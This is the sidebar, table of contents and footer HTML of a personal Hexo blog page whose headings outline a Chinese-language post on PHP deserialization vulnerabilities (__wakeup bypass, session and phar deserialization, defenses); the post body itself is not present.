    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">ll</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#序列化与反序列化"><span class="nav-number">2.</span> <span class="nav-text">序列化与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#对象的属性初始化"><span class="nav-number">2.1.</span> <span class="nav-text">对象的属性初始化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#序列化格式"><span class="nav-number">2.2.</span> <span class="nav-text">序列化格式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#访问修饰符"><span class="nav-number">2.3.</span> <span class="nav-text">访问修饰符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化格式"><span class="nav-number">2.4.</span> <span class="nav-text">反序列化格式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php反序列化漏洞"><span class="nav-number">3.</span> <span class="nav-text">php反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#魔术方法"><span class="nav-number">3.1.</span> <span class="nav-text">魔术方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例题"><span class="nav-number">3.2.</span> <span class="nav-text">例题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wakeup-绕过"><span class="nav-number">4.</span> <span class="nav-text">__wakeup()绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session反序列化"><span class="nav-number">5.</span> <span class="nav-text">session反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#三种处理器"><span class="nav-number">5.1.</span> <span class="nav-text">三种处理器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#产生原因"><span class="nav-number">5.2.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例题-1"><span class="nav-number">5.3.</span> <span class="nav-text">例题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#上传表单"><span class="nav-number">5.4.</span> <span class="nav-text">上传表单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例题-2"><span class="nav-number">5.5.</span> <span class="nav-text">例题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar反序列化"><span class="nav-number">6.</span> <span class="nav-text">phar反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#phar文件结构"><span class="nav-number">6.1.</span> <span class="nav-text">phar文件结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#创建phar文件"><span class="nav-number">6.2.</span> <span class="nav-text">创建phar文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试"><span class="nav-number">6.3.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用条件"><span class="nav-number">6.4.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例题-3"><span class="nav-number">6.5.</span> <span class="nav-text">例题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#学习理解php源码"><span class="nav-number">7.</span> <span class="nav-text">学习理解php源码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#理解php流"><span class="nav-number">7.1.</span> <span class="nav-text">理解php流</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#理解php-wrapper"><span class="nav-number">7.2.</span> <span class="nav-text">理解php wrapper</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看源码"><span class="nav-number">7.3.</span> <span class="nav-text">查看源码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#整理"><span class="nav-number">7.4.</span> <span class="nav-text">整理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试-1"><span class="nav-number">7.5.</span> <span class="nav-text">测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#出现场景"><span class="nav-number">8.</span> <span class="nav-text">出现场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御方法"><span class="nav-number">9.</span> <span class="nav-text">防御方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">10.</span> <span class="nav-text">总结</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ll</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
